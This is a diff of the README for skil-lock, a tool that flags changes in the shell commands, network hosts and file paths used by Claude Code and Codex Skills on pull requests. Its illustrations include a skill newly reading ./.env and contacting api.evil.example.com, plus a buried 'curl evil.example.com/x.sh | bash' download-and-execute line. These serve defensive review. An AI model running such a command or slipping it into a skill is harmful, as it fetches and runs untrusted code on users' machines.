@@ -2,7 +2,7 @@
 
 **Lock the *behavior* of your AI Skills. See exactly what changed in every Pull Request.**
 
-`skil-lock` pins the capability surface — shell commands, network URLs, file paths — of every Claude Code and Codex Skill in your repository. On every PR, a GitHub Action posts a comment showing **what changed**.
+`skil-lock` pins the capability surface - shell commands, network URLs, file paths - of every Claude Code and Codex Skill in your repository. On every PR, a GitHub Action posts a comment showing **what changed**.
 
 Hash pinning catches tampering. SkilLock catches *what the skill is now doing*.
 
@@ -19,11 +19,11 @@ When AI coding agents like [Claude Code](https://code.claude.com/docs/en/skills)
 
 SkilLock records that capability surface in a committed `skills.lock` file. Every PR re-scans, computes the delta, and posts something like this on the PR:
 
-> ### SkilLock — capability changes
+> ### SkilLock - capability changes
 >
 > | Skill | Change | Capability | Detail | Reason |
 > |---|---|---|---|---|
-> | code-review | added | shell_commands | curl | — |
+> | code-review | added | shell_commands | curl | - |
 > | code-review | added | network_urls | https://api.evil.example.com | host not in allowed_domains |
 > | code-review | added | file_reads | ./.env | matches protected_paths |
 >
@@ -96,25 +96,25 @@ A hash tells you *something* changed. It does not tell you *what*. When a review
 
 SkilLock records the surfaces that matter for security review:
 
-- **Shell commands** — does this skill now run `curl`? `rm`? `bash`?
-- **Network URLs** — what hosts does it reach? Did a new one appear?
-- **File reads / writes** — does it read `.env` now? Write to `dist/`?
-- **Allowed tools** — what Claude/Codex tools did the author grant?
-- **Bundled scripts** — what shipped alongside the markdown?
+- **Shell commands** - does this skill now run `curl`? `rm`? `bash`?
+- **Network URLs** - what hosts does it reach? Did a new one appear?
+- **File reads / writes** - does it read `.env` now? Write to `dist/`?
+- **Allowed tools** - what Claude/Codex tools did the author grant?
+- **Bundled scripts** - what shipped alongside the markdown?
 
 A reviewer sees `added file_reads: ./.env` and immediately knows what to ask.
 
 ## Why not just `git diff`?
 
-`git diff` shows you the raw textual change inside `.claude/skills/*/SKILL.md` — every prose tweak, every reformatted bullet, every `# heading` rename, side-by-side with the security-relevant edits. In a long PR with mixed documentation and code changes, a buried `bash -c "curl evil.example.com/x.sh | bash"` inside a fenced code block reads like ordinary documentation.
+`git diff` shows you the raw textual change inside `.claude/skills/*/SKILL.md` - every prose tweak, every reformatted bullet, every `# heading` rename, side-by-side with the security-relevant edits. In a long PR with mixed documentation and code changes, a buried `bash -c "curl evil.example.com/x.sh | bash"` inside a fenced code block reads like ordinary documentation.
 
-SkilLock parses the markdown into structured capability sets — shell commands, network URLs, file reads, file writes, allowed tools, bundled scripts — and diffs the *sets*, not the text. Three concrete differences:
+SkilLock parses the markdown into structured capability sets - shell commands, network URLs, file reads, file writes, allowed tools, bundled scripts - and diffs the *sets*, not the text. Three concrete differences:
 
 - **Signal, not noise.** A 200-line PR that adds `curl` to an unallowed host produces a one-row diff entry. No prose changes appear in the report; reviewers see only the capability surface that moved.
-- **Policy-driven severity.** `.skil-lock.yaml` declares which paths are protected, which domains are allowed, which capabilities require a paste-back approval. `git diff` has no concept of any of that — every line is the same color.
+- **Policy-driven severity.** `.skil-lock.yaml` declares which paths are protected, which domains are allowed, which capabilities require a paste-back approval. `git diff` has no concept of any of that - every line is the same color.
 - **Audit trail.** Approvals live in `.skil-lock-approvals.yaml` with reviewer + timestamp + reason for each delta. `git diff` produces no record of *why* a reviewer accepted the change.
 
-`git diff` stays useful — for prose. SkilLock is what catches the moment a skill silently starts running `rm` or talking to a new host.
+`git diff` stays useful - for prose. SkilLock is what catches the moment a skill silently starts running `rm` or talking to a new host.
 
 ## Compatibility
 
@@ -122,9 +122,9 @@ SkilLock parses the markdown into structured capability sets — shell commands,
 |---|---|---|
 | **Claude Code** | ✅ Supported | Parses `.claude/skills/*/SKILL.md` (YAML frontmatter + Markdown + bundled scripts) |
 | **Codex** | ✅ Supported | Same `SKILL.md` format; parses `.codex/skills/*/SKILL.md` |
-| **Cursor** | 🟡 Planned | Uses a different `manifest.json` format — needs a new parser; tracking demand |
+| **Cursor** | 🟡 Planned | Uses a different `manifest.json` format - needs a new parser; tracking demand |
 | **Copilot Skills** | 🟡 Planned | Format still stabilising; tracking demand |
-| **Windsurf / MCP** | 🟡 Planned | Same as above — open an issue if you'd use it |
+| **Windsurf / MCP** | 🟡 Planned | Same as above - open an issue if you'd use it |
 
 Want a runtime added? Open an issue with a real `SKILL.md`-equivalent fixture from your project; that's the fastest path.
 
@@ -154,18 +154,18 @@ If you want known-bad pattern scanning before you install a skill, use Snyk or M
   }
   ```
 
-- **Interoperability — SARIF + Code Scanning**: see the [GitHub Security tab integration](#github-security-tab-integration-sarif) section above.
+- **Interoperability - SARIF + Code Scanning**: see the [GitHub Security tab integration](#github-security-tab-integration-sarif) section above.
 
 ## What's in v0.1
 
 - CLI: `scan`, `lock`, `init --baseline`, `list`, `diff`, `ci`
 - Runtimes: **Claude Code** and **Codex** (same `SKILL.md` format)
 - Three deterministic detectors: shell execution, external network, protected-path reads/writes
-- `skills.lock` — committed baseline, schema spec'd in [SPEC.md](./SPEC.md)
-- `.skil-lock.yaml` — policy (warn vs block, protected paths, allowed domains)
-- `.skil-lock-approvals.yaml` — override audit trail (reviewer + reason + timestamp)
+- `skills.lock` - committed baseline, schema spec'd in [SPEC.md](./SPEC.md)
+- `.skil-lock.yaml` - policy (warn vs block, protected paths, allowed domains)
+- `.skil-lock-approvals.yaml` - override audit trail (reviewer + reason + timestamp)
 - GitHub Action with PR-comment renderer
-- **SARIF v2.1.0 output** (`--format sarif`) for GitHub Code Scanning integration — findings show up inline in the PR diff *and* in the repo's Security tab
+- **SARIF v2.1.0 output** (`--format sarif`) for GitHub Code Scanning integration - findings show up inline in the PR diff *and* in the repo's Security tab
 
 ## GitHub Security tab integration (SARIF)
 
@@ -189,29 +189,29 @@ jobs:
           sarif: true
 ```
 
-`high`-severity deltas surface as **errors**, `medium` as **warnings**, and `low`/`info` as **notes**. The PR comment is independent — both surfaces show the same data, the SARIF feed just plugs SkilLock into existing Code Scanning workflows. The CLI also exposes this directly: `skil-lock ci --format sarif > skil-lock.sarif`.
+`high`-severity deltas surface as **errors**, `medium` as **warnings**, and `low`/`info` as **notes**. The PR comment is independent - both surfaces show the same data, the SARIF feed just plugs SkilLock into existing Code Scanning workflows. The CLI also exposes this directly: `skil-lock ci --format sarif > skil-lock.sarif`.
 
 ## What's NOT in v0.1 (intentionally)
 
 To keep the scope narrow and the positioning clean:
 
-- No runtime guard / Claude Code hooks integration — different problem
-- No Cursor / Windsurf / MCP parsers — different file formats; expand based on demand
-- No AI-assisted detection — three deterministic detectors only
-- No known-bad pattern database — that's Mondoo's lane
+- No runtime guard / Claude Code hooks integration - different problem
+- No Cursor / Windsurf / MCP parsers - different file formats; expand based on demand
+- No AI-assisted detection - three deterministic detectors only
+- No known-bad pattern database - that's Mondoo's lane
 - No web dashboard or registry
 
 See [`SPEC.md`](./SPEC.md) for the full file-format specification. The out-of-scope list above is the canonical statement of what v0.1 will and will not do.
 
 ## Project status
 
-- CLI: `v0.1.1` — SARIF output for GitHub Code Scanning, multi-platform release binaries
-- GitHub Action: [`skil-lock-action@v0.1.2`](https://github.com/skills-lock/skil-lock-action/releases/tag/v0.1.2) — PR-comment rendering fix
+- CLI: `v0.1.1` - SARIF output for GitHub Code Scanning, multi-platform release binaries
+- GitHub Action: [`skil-lock-action@v0.1.2`](https://github.com/skills-lock/skil-lock-action/releases/tag/v0.1.2) - PR-comment rendering fix
 - Release notes + earlier history: [skil-lock releases](https://github.com/skills-lock/skil-lock/releases) and [skil-lock-action releases](https://github.com/skills-lock/skil-lock-action/releases)
 
 ## License
 
-Apache 2.0 — see [LICENSE](./LICENSE). Contributions are covered by a one-time CLA via [cla-assistant.io](https://cla-assistant.io) (see [CONTRIBUTING.md](./CONTRIBUTING.md)).
+Apache 2.0 - see [LICENSE](./LICENSE). Contributions are covered by a one-time CLA via [cla-assistant.io](https://cla-assistant.io) (see [CONTRIBUTING.md](./CONTRIBUTING.md)).
 
 ## Security
 
